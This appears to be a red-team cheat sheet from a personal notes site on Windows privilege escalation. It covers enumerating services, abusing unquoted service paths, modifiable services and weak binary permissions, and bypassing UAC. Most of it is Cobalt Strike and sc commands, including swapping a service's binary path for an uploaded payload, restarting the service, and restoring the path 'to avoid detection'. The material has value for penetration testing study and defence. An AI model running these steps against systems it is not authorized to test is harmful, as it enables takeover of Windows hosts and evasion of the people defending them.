---
layout:     post
author:     0x5c4r3
type: docs
permalink: Windows_Privesc
---


<span style="font-size: 35px; color:red"><b>Windows Privilege Escalation</b></span>
&nbsp;
<span style="font-size: 25px; color:white"><b>Windows Services</b></span>
Enumerate services:
```shell
sc query
```
OR
```powershell
Get-Service | fl
```
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>Unquoted Service Paths</b></span>
Check with CobaltStrike:
```powershell
execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit UnquotedServicePath
```
List services and their paths (looking for <span style="color: red">Unquoted Service Paths</span>:
```shell
wmic service get name, pathname
```
i.e. For an unquoted service path like C:\Program Files\Vulnerable Services\Service.exe, the OS will look for:
- C:\Program.exe
- C:\Program Files\Vulnerable.exe
- C:\Program Files\Vulnerable Services\Service.exe
&nbsp;
Check permissions on Folders and Files:
```powershell
Get-Acl -Path "C:\Program Files\Vulnerable Services" | fl
```
and check for <span style="color: red">BUILTIN\Users Allow  CreateFiles</span>.
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>Modifiable Services</b></span>
Check with CobaltStrike:
```powershell
execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices
```
After that, use [this](https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/) powershell script to enumerate the service further:
```powershell
powershell-import C:\Tools\Get-ServiceAcl.ps1
powershell Get-ServiceAcl -Name <VulnService> | select -expand Access
```
Check ServiceRights and IdentityReference to see who can do what.
If you have the rights, for instance, you can change the default binary path to an arbitrary file.
Check the current Binary Path:
```powershell
run sc qc <VulnService>
```
Then upload the binary (remember it must be a <span style="color:red">.svc.exe</span>) and reconfigure the path:
```powershell
run sc config <VulnService> binPath= <C:\Temp\tcp-local_x64.svc.exe>
```
Recheck the path and restart the service:
```powershel
run sc qc <VulnService>
run sc stop VulnService
run sc start VulnService
```
Re-change the binary path at the end to avoid detection.
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>Weak Service Binary Permissions</b></span>
When the vulnerability is on the service binary itself:
```powershel
powershell Get-Acl -Path "C:\Program Files\Vulnerable Services\Service.exe" | fl
```
If you get something like <span style="color:red">Access: BUILTIN\Users Allow Modify</span>, then the service is vulnerable and you can overwrite it with your payload.
<span style="color:red">You might need to stop the service first before replacing the .exe</span>.
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>UAC Bypass</b></span>
 Elevation of Medium Integrity processto High integrity.
 CobaltStrike has the [ElevateKit](https://github.com/cobalt-strike/ElevateKit) that allows you to do so.
```powershell
elevate uac-schtasks tcp-local
```
